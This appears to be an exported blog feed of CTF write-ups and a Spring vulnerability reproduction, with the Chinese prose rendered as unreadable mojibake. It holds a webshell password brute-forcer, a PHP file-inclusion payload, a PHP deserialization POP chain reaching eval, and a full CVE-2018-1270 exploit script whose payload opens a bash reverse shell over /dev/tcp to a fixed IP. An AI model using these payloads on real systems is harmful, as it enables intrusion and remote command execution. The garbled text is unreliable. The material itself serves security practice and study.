<p>åˆ°æ­¤æ€è·¯å°±æ˜¯è¦æ‰¾åˆ°æ­¤å†°èé©¬çš„è¿æ¥å¯†ç <br>ä½¿ç”¨è®°äº‹æœ¬å°†see_see_thisæ–‡ä»¶æ‰“å¼€å‘ç°å­˜åœ¨å¤šåˆ—<br><img src="http://img-blog.csdnimg.cn/ab52dce521ec4c63b129761d1a2b6e91.png" alt="456"><br>å°è¯•é›¶å®½åº¦å­—ç¬¦è§£å¯†<br><img src="http://img-blog.csdnimg.cn/179701ca7eee4d2db39ae5ec86ede8de.png" alt="456"><br>å¾—åˆ°çš„base64è¿›è¡Œè§£å¯†<br><img src="http://img-blog.csdnimg.cn/3a594e5c5bf649bab02412ee1fcbc435.png" alt="456"><br>çŒœæµ‹å†°èé©¬å¯†ç æ˜¯8ä½æ•°å­—ï¼Œä¸Šè„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">def</span> <span class="token function">encrypt_number</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
target_hash <span class="token operator">=</span> <span class="token string">"13e40b614fcb3e19"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span> <span class="token number">99999999</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    encrypted_number <span class="token operator">=</span> encrypt_number<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">if</span> encrypted_number <span class="token operator">==</span> target_hash<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found match: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿è¡Œç»“æœä¸º74658263<br>ç„¶åè¿æ¥å†°èé©¬ï¼Œæ‰¾åˆ°flagã€‚<br><img src="http://img-blog.csdnimg.cn/43e4042e208a4b718f01c00e2453a8fd.png" alt="456"><br>flag{1af1bb84-4c97-4b26-a38f-826a88e204f9}</p>
<h4 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h4><p>æ‰“å¼€ç½‘é¡µå¾—åˆ°å¦‚ä¸‹ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//   usr/share/nginx/html </span>

<span class="token variable">$win</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'win'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$win</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token variable">$win</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//  hint.php </span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾ˆæ˜æ˜¾çš„æ–‡ä»¶åŒ…å«æ„é€ playlod</p>
<blockquote>
<p>playload:<a href="http://123.56.121.61:46874/?win=php://filter/convert.base64-encode/resource=hint.php">http://123.56.121.61:46874/?win=php://filter/convert.base64-encode/resource=hint.php</a></p>
</blockquote>
<p>å¾—åˆ°base64è§£ç ï¼Œå¾—åˆ°å¦‚ä¸‹ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">mouse</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$rice</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rice</span><span class="token operator">-></span><span class="token function">nothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">dog</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'chance?'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$fish</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fish</span><span class="token operator">-></span><span class="token property">d</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you wrong'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">get</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$no</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$pop</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sys|pas|read|file|ls|cat|tac|head|tail|more|less|base|echo|cp|\$|\*|\+|\^|scan|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i'</span><span class="token punctuation">,</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you will get flag"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try again!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾ˆæ˜æ˜¾çš„ååºåˆ—åŒ–ï¼Œä»¥åŠæµ…æ‹·è´çš„çŸ¥è¯†ç‚¹ï¼Œæ„é€ é“¾å­ï¼Œåœ¨æ ¹æ®é“¾å­å†™å‡ºphpä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">mouse</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$rice</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">dog</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$fish</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">get</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">fish</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">rice</span><span class="token operator">=</span><span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"print(`nl /realflag/you_want_flag.php`);"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿è¡Œå¾—åˆ°ï¼š<br><code>O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:40:&quot;print(`nl /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</code></p>
<p>æ„é€ payload<br><code>hint.php?pop=O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:40:&quot;print(`nl /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</code></p>
<p>å¾—åˆ°ç½‘é¡µæŸ¥çœ‹æºç å¾—åˆ°flag</p>
<p><img src="http://img-blog.csdnimg.cn/301029e7efed45528b0a39d9af40771e.png" alt="789"></p>
<h4 id="get-source"><a href="#get-source" class="headerlink" title="get_source"></a>get_source</h4><p>æŠ“åŒ…å‘é€å‘ç°X-Powered-By: PHP&#x2F;7.4.21<br>æŸ¥æ‰¾PHP&#x2F;7.4.21ç›¸å…³æ¼æ´<br><img src="http://img-blog.csdnimg.cn/717d39f9506a4893883b9f362135902a.png" alt="456"><br>ä¸é¢˜ç›®ç›¸ç¬¦ï¼Œç»è¿‡å°è¯•å‘ç°è®¿é—®index.htmlå¾—åˆ°æºç <br><img src="http://img-blog.csdnimg.cn/e70f4b47d9444f908f24f820fbad0768.png" alt="456"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç®€å•æ•°ç»„ç»•è¿‡å³å¯</p>
<blockquote>
<p>a[]&#x3D;1&amp;b&#x3D;2&amp;pwn[]&#x3D;1</p>
</blockquote>
<p><img src="http://img-blog.csdnimg.cn/7a032be4d34741b5a94b0828818d427b.png" alt="456"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>springç³»åˆ—æ¼æ´å¤ç°</title>
    <url>/2023/11/21/spring%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="spring-Websocket-RCE-CVE-2018-1270"><a href="#spring-Websocket-RCE-CVE-2018-1270" class="headerlink" title="spring Websocket RCE(CVE-2018-1270)"></a>spring Websocket RCE(CVE-2018-1270)</h2><p>å½±å“èŒƒå›´å¦‚â¬‡ï¸ï¼šSpring Framework 4.3 - 4.3.15Spring Framework 5.0 - 5.0.5</p>
<h3 id="æ¼æ´æŒ‡çº¹"><a href="#æ¼æ´æŒ‡çº¹" class="headerlink" title="æ¼æ´æŒ‡çº¹"></a>æ¼æ´æŒ‡çº¹</h3><p>url&#x2F;gs-guide-websocket<br><img src="https://img-blog.csdnimg.cn/1b2beb875de4447b9b098f8d1711d1bb.png" alt="789"><br>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">random_str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    letters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>letters<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">SockJS</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>base <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random_str<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
        self<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'Referer'</span><span class="token punctuation">:</span> url<span class="token punctuation">,</span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'</span>
        <span class="token punctuation">&#125;</span>
        self<span class="token punctuation">.</span>t <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base<span class="token punctuation">&#125;</span></span><span class="token string">/htmlfile?c=_jp.vulhub'</span></span>
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> response<span class="token punctuation">.</span>iter_lines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">[</span>command<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>

        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>v<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\n\n'</span><span class="token punctuation">)</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>body<span class="token punctuation">)</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base<span class="token punctuation">&#125;</span></span><span class="token string">/xhr_send?t=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>t<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">204</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"send '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">' data error."</span></span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"send '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">' data success."</span></span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


sockjs <span class="token operator">=</span> SockJS<span class="token punctuation">(</span><span class="token string">'http://8.130.100.154:8080/gs-guide-websocket'</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'accept-version'</span><span class="token punctuation">:</span> <span class="token string">'1.1,1.0'</span><span class="token punctuation">,</span>
    <span class="token string">'heart-beat'</span><span class="token punctuation">:</span> <span class="token string">'10000,10000'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'subscribe'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'selector'</span><span class="token punctuation">:</span> <span class="token string">'T(java.lang.Runtime).getRuntime().exec(new String[]&#123;"/bin/bash","-c",'</span>
                <span class="token string">'"exec 5&lt;>/dev/tcp/8.130.100.154/80;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"&#125;)'</span><span class="token punctuation">,</span>
    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string">'sub-0'</span><span class="token punctuation">,</span>
    <span class="token string">'destination'</span><span class="token punctuation">:</span> <span class="token string">'/topic/greetings'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'vulhub'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'send'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'content-length'</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string">'destination'</span><span class="token punctuation">:</span> <span class="token string">'/app/hello'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
